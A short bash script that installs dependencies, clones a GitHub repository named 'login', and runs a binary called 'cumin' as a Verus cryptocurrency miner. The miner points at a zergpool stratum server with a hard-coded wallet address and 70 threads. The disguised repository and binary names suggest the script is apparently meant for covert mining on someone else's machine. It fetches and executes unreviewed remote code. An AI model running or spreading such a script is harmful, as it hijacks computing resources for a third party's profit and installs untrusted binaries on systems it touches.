#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 xdotool -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
./cumin -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW -p x -t 70  c=VRSC,mc=VRSC
